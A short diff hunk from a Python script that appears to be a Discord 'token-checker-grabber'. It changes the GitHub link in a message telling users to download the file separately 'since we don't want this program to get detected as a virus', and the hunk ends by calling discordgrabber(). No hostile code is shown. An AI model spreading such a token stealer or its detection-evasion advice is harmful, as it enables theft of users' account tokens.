@@ -34,7 +34,7 @@ ___________     __                   _________ .__                   __
         """)
   print(bcolors.OKBLUE + """
     You need to download the file, since we don't want this program to get detected as a virus.
-    https://github.com/itssnee/token-checker-grabber
+    https://github.com/itsk0ntra/token-checker-grabber
     """)
   time.sleep(10.00)
 discordgrabber()
